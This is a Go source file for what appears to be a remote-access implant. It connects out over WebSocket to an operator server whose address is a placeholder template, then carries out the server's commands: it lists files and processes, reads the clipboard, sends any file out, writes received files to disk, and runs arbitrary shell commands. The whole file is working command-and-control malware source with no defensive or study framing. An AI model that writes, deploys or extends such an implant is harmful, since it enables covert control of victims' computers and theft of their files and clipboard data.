package main

import (
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strings"

	"net/url"

	"github.com/atotto/clipboard"
	"github.com/gorilla/websocket"
	"github.com/shirou/gopsutil/process"
)

type CommandResponse struct {
	Command string `json:"command"`
	Result  string `json:"result"`
	Action  string `json:"action"`
}

type CommandRequest struct {
	Command string `json:"command"`
}

func connectWebSocket(serverIP string, serverPort string) (*websocket.Conn, error) {
	u := url.URL{Scheme: "ws", Host: fmt.Sprintf("%s:%s", serverIP, serverPort), Path: "/ws"}
	log.Printf("Connecting to server at %s", u.String())
	conn, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		return nil, fmt.Errorf("connection failed: %w", err)
	}
	return conn, nil
}

func handleCommand(conn *websocket.Conn, command string) (string, error) {
	command = strings.TrimSpace(command) 
	var result string
	var err error
	switch command {
	case "list_files":
		return listFiles()
	case "get_clipboard":
		return getClipboardContent()
	case "list_processes":
		return listProcesses()
	case "":
		return "", nil
	default:
		if strings.HasPrefix(command, "download_file ") {
			filePath := strings.TrimSpace(strings.TrimPrefix(command, "download_file "))
			return downloadFileOverWebSocket(conn, filePath)
		} else if strings.HasPrefix(command, "upload_file ") {
			filePath := strings.TrimSpace(strings.TrimPrefix(command, "upload_file "))
			return uploadFileOverWebSocket(conn, filePath)
		} else if strings.HasPrefix(command, "execute_command ") {
			cmd := strings.TrimSpace(strings.TrimPrefix(command, "execute_command "))
			return executeCommand(cmd)
		} else {
			return "", fmt.Errorf("unknown command: %s", command)
		}
	}
	if err != nil {
		result = fmt.Sprintf("Error: %v", err)
	}
	response := CommandResponse{
		Result: result,
	}
	responseData, _ := json.Marshal(response)
	return string(responseData), nil
}

func listFiles() (string, error) {
	files, err := ioutil.ReadDir(".")
	if err != nil {
		return "", err
	}

	var fileList []string
	for _, file := range files {
		fileList = append(fileList, file.Name())
	}
	return strings.Join(fileList, "\n"), nil
}

func getClipboardContent() (string, error) {
	content, err := clipboard.ReadAll()
	if err != nil {
		return "", err
	}
	return content, nil
}

func executeCommand(command string) (string, error) {
	cmd := exec.Command("sh", "-c", command)
	output, err := cmd.CombinedOutput()
	return string(output), err
}

func listProcesses() (string, error) {
	procs, err := process.Processes()
	if err != nil {
		log.Fatalf("Error getting processes: %v", err)
		return "Error listing processes", nil
	}

	var processes []string
	for _, proc := range procs {
		name, err := proc.Name()
		if err != nil {
			continue 
		}
		processes = append(processes, fmt.Sprintf("PID: %d, Name: %s", proc.Pid, name))
	}

	if len(processes) == 0 {
		return "No processes found.", nil
	}
	return fmt.Sprintf("Processes:\n%s", strings.Join(processes, "\n")), nil
}

func receiveAndRespond(conn *websocket.Conn) {
	for {
		messageType, message, err := conn.ReadMessage()
		if err != nil {
			log.Printf("Error reading message: %v", err)
			return
		}

		if messageType == websocket.TextMessage {
			var commandRequest CommandRequest
			log.Printf("Received command from server: %s", message)
			if err := json.Unmarshal(message, &commandRequest); err != nil {
				log.Printf("Error parsing command JSON: %v message %s", err, message)
				continue
			}

			command := strings.TrimSpace(commandRequest.Command)

			result, err := handleCommand(conn, command)
			if err != nil {
				result = fmt.Sprintf("Error: %v", err)
			}
			response := CommandResponse{
				Command: command,
				Result:  result,
				Action:  "send_result",
			}
			responseData, _ := json.Marshal(response)
			log.Printf("JSON: %s", responseData)
			if err := conn.WriteMessage(websocket.TextMessage, responseData); err != nil {
				log.Printf("Error sending response: %v", err)
			}
		} else if messageType == websocket.BinaryMessage {
			log.Printf("Received binary message with size: %d bytes", len(message))
		}

	}
}

func uploadFileOverWebSocket(conn *websocket.Conn, filePath string) (string, error) {
	fileInfo, err := os.Stat(filePath)
	if err != nil {
		return "", fmt.Errorf("error getting file info: %w", err)
	}
	filename := fileInfo.Name()
	filesize := fileInfo.Size()
	uploadNotification := map[string]interface{}{
		"action":   "upload_file",
		"filename": filename,
		"filesize": filesize,
	}
	notificationMessage, _ := json.Marshal(uploadNotification)
	err = conn.WriteMessage(websocket.TextMessage, notificationMessage)
	if err != nil {
		return "", fmt.Errorf("error sending upload notification: %w", err)
	}
	log.Printf("Sent upload notification: filename=%s, filesize=%d", filename, filesize)
	file, err := os.Open(filePath)
	if err != nil {
		return "", fmt.Errorf("error opening file: %w", err)
	}
	defer file.Close()
	chunkSize := 1024 * 4
	buffer := make([]byte, chunkSize)
	for {
		n, err := file.Read(buffer)
		if err != nil {
			if err == io.EOF {
				break
			}
			return "", fmt.Errorf("error reading file: %w", err)
		}

		err = conn.WriteMessage(websocket.BinaryMessage, buffer[:n])
		if err != nil {
			return "", fmt.Errorf("error uploading file chunk: %w", err)
		}
		log.Printf("Uploaded chunk of %d bytes", n)
	}

	uploadCompleteMessage := map[string]string{
		"action": "upload_completed",
	}
	completeMessage, _ := json.Marshal(uploadCompleteMessage)
	err = conn.WriteMessage(websocket.TextMessage, completeMessage)
	if err != nil {
		return "", fmt.Errorf("error sending upload completion message: %w", err)
	}

	log.Println("Upload completed successfully.")
	return fmt.Sprintf("File %s uploaded successfully", filePath), nil
}

func downloadFileOverWebSocket(conn *websocket.Conn, filePath string) (string, error) {
	downloadRequest := map[string]string{
		"action":   "download_file",
		"filename": filePath,
	}
	requestMessage, _ := json.Marshal(downloadRequest)
	err := conn.WriteMessage(websocket.TextMessage, requestMessage)
	if err != nil {
		return "", fmt.Errorf("error sending download request: %w", err)
	}

	file, err := os.Create(filePath)
	if err != nil {
		return "", fmt.Errorf("error creating file: %w", err)
	}
	defer file.Close()

	for {
		messageType, fileData, err := conn.ReadMessage()
		if err != nil {
			return "", fmt.Errorf("error reading file data: %w", err)
		}
		if messageType == websocket.TextMessage {
			var response map[string]string
			if err := json.Unmarshal(fileData, &response); err == nil {
				if response["status"] == "completed" {
					log.Println("File download completed.")
					break
				}
			}
		}
		if messageType == websocket.BinaryMessage {
			_, err = file.Write(fileData)
			if err != nil {
				return "", fmt.Errorf("error writing to file: %w", err)
			}
			log.Printf("Received and saved %d bytes", len(fileData))
		}
	}

	return fmt.Sprintf("File %s downloaded successfully", filePath), nil
}

func main() {
	serverIP := "{ip}"
	serverPort := "{port}"
	//serverIP := "127.0.0.1"
	//serverPort := "8081"
	conn, err := connectWebSocket(serverIP, serverPort)
	if err != nil {
		log.Fatalf("Failed to connect to server: %v", err)
	}
	defer conn.Close()

	receiveAndRespond(conn)
}
